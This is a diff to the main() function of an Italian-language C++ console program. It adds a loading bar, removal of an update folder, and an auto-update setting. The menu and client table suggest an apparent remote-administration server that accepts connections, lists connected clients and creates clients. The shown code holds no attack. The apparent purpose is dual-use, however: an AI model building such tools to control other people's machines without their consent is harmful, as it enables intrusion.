@@ -27,7 +27,6 @@ int main()
     Settaggi settaggi;
     ConsoleUtils cu;
     WindowUtils wu;
-    //SystemUtils su;
     TcpIP Server;
     Clu = new ClientUtils(settaggi);
 
@@ -37,11 +36,18 @@ int main()
 
     bool CicloMenu = true;
 
+    cli.LoadingPercentage = 0;
+    cli.LoadingText = "Caricamento Menu Principale...";
+    cli.FullBarWithText(25);
+
     MenuPrincipale.push_back("Esci");
     MenuPrincipale.push_back("Connetti Sessione");
     MenuPrincipale.push_back("Crea Client");
     MenuPrincipale.push_back("Comandi Comuni");
     MenuPrincipale.push_back("Impostazioni");
+
+    cli.LoadingPercentage = 10;
+    cli.LoadingText = "Caricamento Tabella Clients...";
 
     HeaderTabella.push_back("ID");
     HeaderTabella.push_back("IP");
@@ -52,20 +58,46 @@ int main()
     HeaderTabella.push_back("OS");
     HeaderTabella.push_back("Stato");
 
+    cli.LoadingPercentage = 20;
+    cli.LoadingText = "Rimozione Update...";
+
+    du.SetCurrDir(du.GetModuleFilePath());
+    if (du.CheckDir("Update"))
+        du.DelDir("Update");
+
+    cli.LoadingPercentage = 30;
+    cli.LoadingText = "Caricamento Impostazioni...";
+
     if (!settaggi.GetSettings())
     {
+        cli.StopBar(250);
+
         tc.SetColor(tc.Red);
         cout << "Errore nel caricamento delle impostazioni." << endl;
         _getch();
         return 0;
     }
 
+    cli.LoadingPercentage = 40;
+    cli.LoadingText = "Controllo Aggiornamenti...";
+
+    if (settaggi.VerificaAggiornamenti)
+        VerificaAggiornamenti(settaggi.AutoAggiornamento);
+
+    cli.LoadingPercentage = 50;
+    cli.LoadingText = "Impostazione Finestra...";
+
     Clu->AggiornaTitolo(Clu->Menu);
     wu.SetWindowSize({ settaggi.DimensioniFinestra.X, settaggi.DimensioniFinestra.Y });
+
+    cli.LoadingPercentage = 60;
+    cli.LoadingText = "Avvio Server...";
 
     Server.Port = settaggi.Porta;
     if (Server.StartServer() != 0)
     {
+        cli.StopBar(250);
+
         tc.SetColor(tc.Red);
         cout << "Errore nell'avvio del server." << endl;
         Server.Stop();
@@ -73,10 +105,17 @@ int main()
         return 0;
     }
 
+    cli.LoadingPercentage = 90;
+    cli.LoadingText = "Avvio Servizi...";
+
     thread Aconn(AccettaConnessioni, ref(Server));
     thread Vconn(VerificaConnessioni);
     Aconn.detach();
     Vconn.detach();
+
+    cli.LoadingPercentage = 100;
+    cli.LoadingText = "Completato";
+    cli.StopBar(1000);
 
     while (CicloMenu)
     {
@@ -190,13 +229,18 @@ int main()
                             settaggi.VerificaAggiornamenti = !settaggi.VerificaAggiornamenti;
                             break;
 
-                        // Colori
+                            // Auto Aggiornamenti
                         case 3:
+                            settaggi.AutoAggiornamento = !settaggi.AutoAggiornamento;
+                            break;
+
+                        // Colori
+                        case 4:
                             //TODO implementare l'impostazione dei colori
                             break;
 
                         // Dimensione della finestra
-                        case 4:
+                        case 5:
                             cout << "\nRidimensiona le finestra a piacimento e premi invio per salvare." << endl;
                             _getch();
 
